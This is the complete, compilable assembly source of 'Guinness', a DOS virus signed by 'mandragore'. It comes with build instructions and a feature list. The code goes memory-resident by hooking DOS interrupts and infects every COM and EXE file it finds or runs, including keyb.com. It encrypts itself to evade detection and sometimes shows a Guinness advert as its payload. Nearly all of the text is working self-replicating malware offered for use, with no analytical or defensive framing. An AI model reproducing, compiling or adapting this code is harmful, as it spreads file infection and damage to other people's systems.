title                           Guinness

comment #$*ש*$*ש*$*ש*$*ש*$*ש*$*ש*$*ש*$*ש*$*ש*$*ש*$*ש*$*ש*$*ש*$*ש*$*ש*$*ש*$*ש*

 Skillz:
 - infect all exe/com in the dir, and at run/search while tsr.
 - disinf at exec, reinf on exit, infect keyb.com at runtime
 - hook int 24 while infecting
 - TSR part needed to run infected host
 - the virus is crypted usin the equip. info word (slow encryption)
 - payload: disp sometimes a pub for Guinness and wait for a keystroke

 Be carefull, this virus is really infectious, like the passion for my 
 favourite beer, i called it : GUINNESS! sounds like a TV game no? :)
 Compile w/ tasm /m3 and tlink /t.


                                               ש mandragore! ש-קנ

 respects to urgo32, all DDT memberz, and all past Invaders membrz.
 credits to Jacky_Querty/29A for the basic principe (dogpaw).

$*ש*$*ש*$*ש*$*ש*$*ש*$*ש*$*ש*$*ש*$*ש*$*ש*$*ש*$*ש*$*ש*$*ש*$*ש*$*ש*$*ש*$*ש*$*ש*#

.model tiny
.code
.386p
bptr    equ <byte ptr>
wptr    equ <word ptr>
dptr    equ <dword ptr>
%out    mandragore'z prod!
        org 100h
start:
        int 11h
        and al,1         ;  anti-emul
        je d_vir

        lea si,boc
        mov di,si
        mov cx,(virsiz-(boc-start))/2+1
d_vir:  lodsw
        xor ax,1234h
        org $-2
dkey    dw 0
        stosw
        loop d_vir

boc:    mov ax,3d04h
        int 21h
        jnc leav

        mov ax,ds
        dec ax
        mov ds,ax
        mov si,12h
        mov ax,[si]
        sub ax,(virsiz*2)/16+2          ;  decrease TOM
        mov [si],ax
        sub wptr ds:[3],(virsiz*2)/16+2 ;  and free RAM
        mov si,cx
        mov dl,'M'
        xchg [si],dl
        mov ds,ax
        mov [si],dl             ;  chain MCBs
        inc si
        mov wptr [si],8
        mov wptr [si+2],(virsiz*2)/16+1
        inc ax
        mov es,ax
        push cs
        pop ds
        mov di,cx
        mov si,100h
        mov cx,virsiz
        rep movsb               ;  go in ram

        push ds
        push 0
        pop ds
        shl eax,10h
        mov ax,hook24-start
        mov es:[int24-start],eax
        mov ax,hook21-start     ;  modify IVT
        xchg eax,ds:[84h]
        mov es:[old21-start],eax
        pop ds

        mov ax,3d04h
        lea dx,keyb             ;  infect keyb.com
        int 21h

leav:   mov ah,1ah
        lea dx,hook21
        int 21h                 ;  set DTA to unused part of code
        mov ah,4eh
        lea dx,tofind
        int 21h                 ;  infect all com/exe in the dir
        mov ah,4fh
        int 21h
        jnc $-4

        mov es,ds:[2ch]
        mov di,cx
        mov ax,cx
        dec cx
getnm:  repnz scasb             ;  get our filename from envir. seg.
        cmp bptr es:[di],0
        jne getnm
        add di,3
        mov offnh,di
        mov segnh,es

        mov ax,3d02h
        lds dx,dptr [offnh]     ;  open r/w for disinf
        int 21h
        xchg ax,bx
        push bx
        mov ax,1220h
        int 2fh
        mov bl,es:[di]          ;  get SFT
        xor bh,bh
        mov ax,1216h
        int 2fh
        pop bx
        mov ax,es:[di+11h]
        sub ax,virsiz
        mov es:[di+15h],ax      ;  lseek to org bof (eof-virsiz)
        push ax
        push cs
        pop ds
        mov ah,3fh
        mov cx,virsiz
        lea dx,hook21           ;  read org bof
        mov si,dx
        int 21h
        pop ax
        mov es:[di+11h],ax      ;  remove org bof (tronc file)
        xor ax,ax
        mov es:[di+15h],ax      ;  lseek to bof
        push cx
        mov ax,0
        org $-2
dkey2   dw 0
        mov cx,virsiz/2+1
d_bg:   xor wptr [si],ax        ;  decrypt
        inc si
        inc si
        loop d_bg
        pop cx
        mov ah,40h
        int 21h                 ;  put org bof
        mov ah,3eh
        int 21h
        mov ah,0dh
        int 21h                 ;  flushes disk buffers

        in al,40h
        cmp al,0e6h             ;  ~ 10% left
        jb nopay
        and al,3
        mov cl,30
        mul cl
        lea dx,pub              ;  choose mess
        cbw
        add dx,ax
        mov ah,9
        int 21h                 ;  disp
        xor ax,ax
        int 16h
nopay:
        push cs
        pop es
        mov ah,4ah              ;  lazyness :)
        mov bx,(hook21-start+100h)/16+1
        int 21h

        lea bx,pb
        mov [bx+4],ax
        mov [bx+8],ax           ;  adapt Param. Block
        mov [bx+12],ax
        mov ax,4b04h            ;  4b sub 04 : exec but no inf.
        lds dx,dptr [offnh]
        int 21h

        lds dx,dptr cs:[offnh]
        mov ax,3d04h            ;  reinfection
        int 21h
        mov ah,4dh              ;  get ret flag
        int 21h
        mov ah,4ch              ;  end w/ same ret flag
        int 21h

;---------------  datas

pub     db 'Lovely day for a Guinness!',13,10,7,'$'
        db 'Guinness is good for you! ',13,10,7,'$'
        db 'Guinness for strength!    ',13,10,7,'$'
        db 'mandragore loves Guinness!',13,10,7,'$'

offnh   dw 0
segnh   dw 0

pb      dw 0    ;  same envir. seg.
cmdoff  dw 80h  ;  same cmd line
cmdseg  dw ?
fcb1off dw 5ch  ;  FCBs from our PSP
fcb1seg dw ?
fcb2off dw 6ch  ;       "
fcb2seg dw ?

keyb    db 'c:\windows\command\keyb.com',0
tofind  db '*.*',0
int24   dd 0

;---------------  hooker

hook21: pushf
        cmp ax,3d04h    ;  infect / iret
        je sinf
        cmp ah,4fh
        je find         ;\
        cmp ah,4eh      ; >Ä  find 1st/next
        je find         ;/
        push ax
        xor ah,4bh      ;  exec
        pop ax
        jne back21
        cmp al,4
        jne dinfct      ;  who use the european ver of dos 4.0 ?
        mov al,0
back21: popf
        db 0eah
old21   dd ?

        db 'mandragore!',0,'[Guinness]',0

find:   call dptr cs:[old21-start]
        push ax bp
        mov bp,sp
        pushf
        pop ax
        mov [bp+8],ax           ;  update stack to ret
        pop bp ax
        push dx ds ax bx es
        mov ah,2fh
        int 21h                 ;  get dta
        push es
        pop ds
        mov dx,bx
        add dx,1eh              ;  set ds:dx to file
        pop es bx ax
        call infct
        pop ds dx
        iret                     ;  post chaining

sinf:   call infct
        popf                     ;  no chaining
        iret

dinfct: call infct
        jmp back21               ;  pre chaining

infct:  pusha
        push es ds
        push 0
        pop ds
        mov eax,cs:[int24-start]
        xchg ds:[24h*4],eax             ;  hook int24
        mov cs:[int24-start],eax
        pop ds
        push ds
        mov ax,3d02h
        int 21h                         ;  open
        jc noi
        xchg ax,bx
        push cs
        pop ds
        push bx
        mov ax,1220h
        int 2fh
        mov bx,es:[di]                  ;  get SFTs
        xor bh,bh
        mov ax,1216h
        int 2fh
        pop bx
        cmp wptr es:[di+20h],'OC'       ;  avoid command.com
        je eoi
        mov ax,es:[di+28h]
        cmp ax,'OC'
        jz $+7                          ;  exe/com? 
        cmp ax,'XE'
        jnz eoi
        cmp dptr es:[di+11h],64*1024-virsiz ;  too big?
        ja eoi
        mov ah,3fh
        mov cx,virsiz
        mov dx,cx                       ;  read bof after us in ram
        int 21h
        sub ax,cx                       ;  too short?
        jc eoi
        mov si,virsiz/2+1
        xchg cx,si
        cmp dptr [si],012411cdh         ;  already infected?
        je eoi
;        jmp eoi                 ;  ########

        int 11h
crypbg: xor wptr [si],ax                ;  crypt
        inc si
        inc si
        loop crypbg
        mov ds:[dkey2-start],ax

        mov ax,es:[di+11h]
        mov es:[di+15h],ax              ;  lseek to eof
        mov ah,40h
        mov cx,dx
        int 21h                         ;  write orginial bof

        xor si,si
        mov wptr es:[di+15h],si         ;  lseek to bof

        push cs
        pop es
        mov di,cx
        push di
        rep movsb

        int 11h                         ;  crypt key
        xchg dx,ax
        mov si,virsiz+(boc-start)
        mov di,si
        mov cx,(virsiz-(boc-start))/2+1
c_vir:  lodsw
        xor ax,dx                       ;  crypt vir
        stosw
        loop c_vir
        mov ds:[dkey-start+virsiz],dx

        mov ah,40h
        pop cx
        mov dx,cx                       ;  inject vir
        int 21h
eoi:    mov ah,3eh
        int 21h
noi:    push 0
        pop ds
        mov eax,cs:[int24-start]
        xchg ds:[24h*4],eax             ; restore int 24h
        mov cs:[int24-start],eax
        pop ds es
        popa
        ret

hook24: mov al,3
        iret

eof:
virsiz  equ eof-start

buff:   db virsiz dup (90h)
        org $-virsiz
        db 0b8h,6,4ch,0cdh,21h
end start
